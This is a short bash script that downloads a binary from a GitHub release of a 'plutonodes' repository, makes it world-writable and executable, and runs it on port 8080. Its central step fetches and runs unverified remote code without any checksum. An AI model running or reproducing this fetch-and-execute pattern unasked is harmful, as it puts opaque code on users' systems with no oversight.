#!/bin/bash
FLIE_PATH=$(pwd)/world/app/
if [ ! -d "${FLIE_PATH}" ]; then
  mkdir -p ${FLIE_PATH}
fi
if command -v curl &>/dev/null; then
        DOWNLOAD_CMD="curl -sLJo"
    # Check if wget is available
  elif command -v wget &>/dev/null; then
        DOWNLOAD_CMD="wget -qO"
  else
        echo "Error: Neither curl nor wget found. Please install one of them."
        sleep 30
        exit 1
fi

$DOWNLOAD_CMD ${FLIE_PATH}app https://github.com/dsadsadsss/plutonodes/releases/download/xr/app-amd-9

chmod 777 ${FLIE_PATH}app
${FLIE_PATH}app -p 8080